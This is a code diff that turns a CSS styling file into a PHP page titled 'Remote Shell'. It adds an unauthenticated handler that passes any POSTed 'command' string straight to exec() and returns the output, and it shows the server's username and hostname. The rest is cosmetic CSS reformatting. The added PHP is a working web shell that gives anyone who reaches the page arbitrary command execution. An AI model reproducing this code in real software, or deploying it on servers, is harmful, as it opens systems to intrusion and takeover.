@@ -1,26 +1,33 @@
-    /**
-     * @author:             jRimbault
-     * @date:               2017-07-13
-     * @last modified date: 2017-07-18
-     *
-     * @note: Styling
-     */
-    html,
-    body,
-    input {
+<?php
+if (isset($_POST['command'])) {
+    header('Content-Type: application/json');
+
+    $command = trim($_POST['command']);
+    $json['status'] = 0;
+
+    if ($command != '') {
+        exec("$command 2>&1", $output, $json['status']);
+        $json['output'] = PHP_EOL . join(PHP_EOL, $output) . PHP_EOL;
+    }
+
+    die(json_encode($json));
+}
+?>
+<!doctype html>
+
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Remote Shell</title>
+<style>
+    html, body, input {
         margin: 0;
         padding: 0;
         background-color: #222222;
     }
-    html,
-    body,
-    input,
-    .dir:before,
-    .dir:after {
+    html, body, input, .dir:before, .dir:after {
         color: #dddddd;
     }
-    div#output,
-    input {
+    div#output, input {
         font-family: "Consolas", "Menlo", monospace;
     }
     div#output {
@@ -32,14 +39,8 @@
         width: 500px;
         font-size: .98em;
     }
-    input,
-    input:active,
-    input:focus,
-    input:enabled,
-    input:-webkit-autofill:active,
-    input:-webkit-autofill:focus,
-    input:-webkit-autofill:enabled,
-    input:-webkit-autofill {
+    input, input:active, input:focus, input:enabled, input:-webkit-autofill:active,
+    input:-webkit-autofill:focus, input:-webkit-autofill:enabled, input:-webkit-autofill {
         background-color: #222222;
         color: #dddddd;
         border: none;
@@ -47,8 +48,7 @@
         -webkit-box-shadow: 0 0 0 30px #222222 inset;
         -webkit-text-fill-color: #dddddd !important;
     }
-    .dir,
-    .prompt {
+    .dir, .prompt {
         font-weight: 600;
     }
     .prompt {
@@ -77,3 +77,10 @@
         height: 100%;
         background-color: #dddddd;
     }
+</style>
+
+<span id="username" class="hide"><?= posix_getpwuid(posix_geteuid())['name'] ?></span>
+<span id="hostname" class="hide"><?= gethostname() ?></span>
+
+<div id="output"></div>
+<div id="overlay"></div>
